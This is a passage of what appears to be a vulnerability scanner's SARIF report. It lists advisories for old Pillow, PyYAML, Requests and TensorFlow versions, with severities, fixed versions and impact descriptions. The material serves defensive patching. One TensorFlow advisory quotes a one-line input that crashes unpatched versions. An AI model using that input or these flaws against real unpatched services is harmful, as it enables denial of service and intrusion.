              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-24303"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24303",
              "help": {
                "text": "Vulnerability CVE-2022-24303\nSeverity: high\nFixed Version: 9.0.1\nLink: [CVE-2022-24303](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24303)\nPillow before 9.0.1 allows attackers to delete files because spaces in temporary pathnames are mishandled.",
                "markdown": "**Vulnerability CVE-2022-24303**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|9.0.1|[CVE-2022-24303](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24303)|\n\nPillow before 9.0.1 allows attackers to delete files because spaces in temporary pathnames are mishandled."
              },
              "properties": {
                "security-severity": "9.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-45198",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-45198"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45198",
              "help": {
                "text": "Vulnerability CVE-2022-45198\nSeverity: high\nFixed Version: 9.2.0\nLink: [CVE-2022-45198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45198)\nPillow before 9.2.0 performs Improper Handling of Highly Compressed GIF Data (Data Amplification).",
                "markdown": "**Vulnerability CVE-2022-45198**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|9.2.0|[CVE-2022-45198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45198)|\n\nPillow before 9.2.0 performs Improper Handling of Highly Compressed GIF Data (Data Amplification)."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-44271",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-44271"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44271",
              "help": {
                "text": "Vulnerability CVE-2023-44271\nSeverity: high\nFixed Version: 10.0.0\nLink: [CVE-2023-44271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44271)\nAn issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument.",
                "markdown": "**Vulnerability CVE-2023-44271**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|10.0.0|[CVE-2023-44271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44271)|\n\nAn issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-4863",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-4863"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4863",
              "help": {
                "text": "Vulnerability CVE-2023-4863\nSeverity: high\nFixed Version: 10.0.1\nLink: [CVE-2023-4863](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4863)\nHeap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page.",
                "markdown": "**Vulnerability CVE-2023-4863**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|10.0.1|[CVE-2023-4863](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4863)|\n\nHeap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "GHSA-56pw-mpj4-fxww",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-56pw-mpj4-fxww"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://github.com/advisories/GHSA-56pw-mpj4-fxww",
              "help": {
                "text": "Vulnerability GHSA-56pw-mpj4-fxww\nSeverity: high\nFixed Version: 10.0.1\nLink: [GHSA-56pw-mpj4-fxww](https://github.com/advisories/GHSA-56pw-mpj4-fxww)\nPillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",
                "markdown": "**Vulnerability GHSA-56pw-mpj4-fxww**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|10.0.1|[GHSA-56pw-mpj4-fxww](https://github.com/advisories/GHSA-56pw-mpj4-fxww)|\n\nPillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2."
              },
              "properties": {
                "security-severity": "8.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-50447",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-50447"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50447",
              "help": {
                "text": "Vulnerability CVE-2023-50447\nSeverity: critical\nFixed Version: 10.2.0\nLink: [CVE-2023-50447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50447)\nPillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).",
                "markdown": "**Vulnerability CVE-2023-50447**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|10.2.0|[CVE-2023-50447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50447)|\n\nPillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter)."
              },
              "properties": {
                "security-severity": "8.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2024-28219",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-28219"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28219",
              "help": {
                "text": "Vulnerability CVE-2024-28219\nSeverity: high\nFixed Version: 10.3.0\nLink: [CVE-2024-28219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28219)\nIn _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy.",
                "markdown": "**Vulnerability CVE-2024-28219**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|10.3.0|[CVE-2024-28219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28219)|\n\nIn _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy."
              },
              "properties": {
                "security-severity": "6.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-14343",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-14343"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14343",
              "help": {
                "text": "Vulnerability CVE-2020-14343\nSeverity: critical\nFixed Version: 5.4\nLink: [CVE-2020-14343](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14343)\nA vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",
                "markdown": "**Vulnerability CVE-2020-14343**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|5.4|[CVE-2020-14343](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14343)|\n\nA vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2023-32681",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-32681"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32681",
              "help": {
                "text": "Vulnerability CVE-2023-32681\nSeverity: medium\nFixed Version: 2.31.0\nLink: [CVE-2023-32681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32681)\n### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3`s ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn`t make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you`re currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get(`http://github.com/`, allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)",
                "markdown": "**Vulnerability CVE-2023-32681**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.31.0|[CVE-2023-32681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32681)|\n\n### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3`s ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn`t make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you`re currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get(`http://github.com/`, allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)"
              },
              "properties": {
                "security-severity": "6.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2024-35195",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-35195"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35195",
              "help": {
                "text": "Vulnerability CVE-2024-35195\nSeverity: medium\nFixed Version: 2.32.0\nLink: [CVE-2024-35195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35195)\nWhen making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.\n\n### Remediation\nAny of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.\n\n* Upgrade to `requests\u003e=2.32.0`.\n* For `requests\u003c2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.\n* For `requests\u003c2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.\n\n### Related Links\n* https://github.com/psf/requests/pull/6655",
                "markdown": "**Vulnerability CVE-2024-35195**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.32.0|[CVE-2024-35195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35195)|\n\nWhen making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.\n\n### Remediation\nAny of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.\n\n* Upgrade to `requests\u003e=2.32.0`.\n* For `requests\u003c2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.\n* For `requests\u003c2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.\n\n### Related Links\n* https://github.com/psf/requests/pull/6655"
              },
              "properties": {
                "security-severity": "5.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2019-16778",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2019-16778"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16778",
              "help": {
                "text": "Vulnerability CVE-2019-16778\nSeverity: low\nFixed Version: 1.15.0\nLink: [CVE-2019-16778](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16778)\n### Impact\n\nA heap buffer overflow in `UnsortedSegmentSum` can be produced when the `Index` template argument is `int32`. In this case `data_size` and `num_segments` fields are truncated from `int64` to `int32` and can produce negative numbers, resulting in accessing out of bounds heap memory.\n\nThis is unlikely to be exploitable and was detected and fixed internally. We are making the security advisory only to notify users that it is better to update to TensorFlow 1.15 or 2.0 or later as these versions already have this fixed.\n\n### Patches\n\nPatched by db4f9717c41bccc3ce10099ab61996b246099892 and released in all official releases after 1.15 and 2.0.\n\n### For more information\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2019-16778**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|1.15.0|[CVE-2019-16778](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16778)|\n\n### Impact\n\nA heap buffer overflow in `UnsortedSegmentSum` can be produced when the `Index` template argument is `int32`. In this case `data_size` and `num_segments` fields are truncated from `int64` to `int32` and can produce negative numbers, resulting in accessing out of bounds heap memory.\n\nThis is unlikely to be exploitable and was detected and fixed internally. We are making the security advisory only to notify users that it is better to update to TensorFlow 1.15 or 2.0 or later as these versions already have this fixed.\n\n### Patches\n\nPatched by db4f9717c41bccc3ce10099ab61996b246099892 and released in all official releases after 1.15 and 2.0.\n\n### For more information\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "2.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2020-5215",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-5215"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215",
              "help": {
                "text": "Vulnerability CVE-2020-5215\nSeverity: low\nFixed Version: 1.15.2\nLink: [CVE-2020-5215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215)\n### Impact\n\nConverting a string (from Python) to a `tf.float16` value results in a segmentation fault in eager mode as the format checks for this use case are only in the graph mode.\n\nThis issue can lead to denial of service in inference/training where a malicious attacker can send a data point which contains a string instead of a `tf.float16` value.\n\nSimilar effects can be obtained by manipulating saved models and checkpoints whereby replacing a scalar `tf.float16` value with a scalar string will trigger this issue due to automatic conversions.\n\nThis can be easily reproduced by `tf.constant(\"hello\", tf.float16)`, if eager execution is enabled.\n\n### Patches\nWe have patched the vulnerability in GitHub commit [5ac1b9](https://github.com/tensorflow/tensorflow/commit/5ac1b9e24ff6afc465756edf845d2e9660bd34bf).\n\nWe are additionally releasing TensorFlow 1.15.1 and 2.0.1 with this vulnerability patched.\n\nTensorFlow 2.1.0 was released after we fixed the issue, thus it is not affected.\n\nWe encourage users to switch to TensorFlow 1.15.1, 2.0.1 or 2.1.0.\n\n### For more information\n\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2020-5215**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|1.15.2|[CVE-2020-5215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215)|\n\n### Impact\n\nConverting a string (from Python) to a `tf.float16` value results in a segmentation fault in eager mode as the format checks for this use case are only in the graph mode.\n\nThis issue can lead to denial of service in inference/training where a malicious attacker can send a data point which contains a string instead of a `tf.float16` value.\n\nSimilar effects can be obtained by manipulating saved models and checkpoints whereby replacing a scalar `tf.float16` value with a scalar string will trigger this issue due to automatic conversions.\n\nThis can be easily reproduced by `tf.constant(\"hello\", tf.float16)`, if eager execution is enabled.\n\n### Patches\nWe have patched the vulnerability in GitHub commit [5ac1b9](https://github.com/tensorflow/tensorflow/commit/5ac1b9e24ff6afc465756edf845d2e9660bd34bf).\n\nWe are additionally releasing TensorFlow 1.15.1 and 2.0.1 with this vulnerability patched.\n\nTensorFlow 2.1.0 was released after we fixed the issue, thus it is not affected.\n\nWe encourage users to switch to TensorFlow 1.15.1, 2.0.1 or 2.1.0.\n\n### For more information\n\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "5.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2020-15190",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15190"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15190",
              "help": {
                "text": "Vulnerability CVE-2020-15190\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15190](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15190)\n### Impact\nThe [`tf.raw_ops.Switch`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Switch) operation takes as input a tensor and a boolean and outputs two tensors. Depending on the boolean value, one of the tensors is exactly the input tensor whereas the other one should be an empty tensor.\n\nHowever, the eager runtime traverses all tensors in the output:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/common_runtime/eager/kernel_and_device.cc#L308-L313\n\nSince only one of the tensors is defined, the other one is `nullptr`, hence we are binding a reference to `nullptr`. This is undefined behavior and reported as an error if compiling with `-fsanitize=null`. In this case, this results in a segmentation fault\n\n### Patches\nWe have patched the issue in da8558533d925694483d2c136a9220d6d49d843c and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15190**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15190](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15190)|\n\n### Impact\nThe [`tf.raw_ops.Switch`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Switch) operation takes as input a tensor and a boolean and outputs two tensors. Depending on the boolean value, one of the tensors is exactly the input tensor whereas the other one should be an empty tensor.\n\nHowever, the eager runtime traverses all tensors in the output:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/common_runtime/eager/kernel_and_device.cc#L308-L313\n\nSince only one of the tensors is defined, the other one is `nullptr`, hence we are binding a reference to `nullptr`. This is undefined behavior and reported as an error if compiling with `-fsanitize=null`. In this case, this results in a segmentation fault\n\n### Patches\nWe have patched the issue in da8558533d925694483d2c136a9220d6d49d843c and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15209",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15209"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209",
              "help": {
                "text": "Vulnerability CVE-2020-15209\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209)\n### Impact\nA crafted TFLite model can force a node to have as input a tensor backed by a `nullptr` buffer. This can be achieved by changing a buffer index in the flatbuffer serialization to convert a read-only tensor to a read-write one. The runtime assumes that these buffers are written to before a possible read, hence they are initialized with `nullptr`:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L1224-L1227\n\nHowever, by changing the buffer index for a tensor and implicitly converting that tensor to be a read-write one, as there is nothing in the model that writes to it, we get a null pointer dereference.\n\n### Patches\nWe have patched the issue in 0b5662bc and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 but was also discovered through variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45).",
                "markdown": "**Vulnerability CVE-2020-15209**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209)|\n\n### Impact\nA crafted TFLite model can force a node to have as input a tensor backed by a `nullptr` buffer. This can be achieved by changing a buffer index in the flatbuffer serialization to convert a read-only tensor to a read-write one. The runtime assumes that these buffers are written to before a possible read, hence they are initialized with `nullptr`:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L1224-L1227\n\nHowever, by changing the buffer index for a tensor and implicitly converting that tensor to be a read-write one, as there is nothing in the model that writes to it, we get a null pointer dereference.\n\n### Patches\nWe have patched the issue in 0b5662bc and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 but was also discovered through variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45)."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15194",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15194"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15194",
              "help": {
                "text": "Vulnerability CVE-2020-15194\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15194)\n### Impact\nThe `SparseFillEmptyRowsGrad` implementation has incomplete validation of the shapes of its arguments:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L235-L241\n\nAlthough `reverse_index_map_t` and `grad_values_t` are accessed in a similar pattern, only `reverse_index_map_t` is validated to be of proper shape. Hence, malicious users can pass a bad `grad_values_t` to trigger an assertion failure in `vec`, causing denial of service in serving installations.\n\n### Patches\nWe have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability is a variant of [GHSA-63xm-rx5p-xvqr](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-63xm-rx5p-xvqr)",
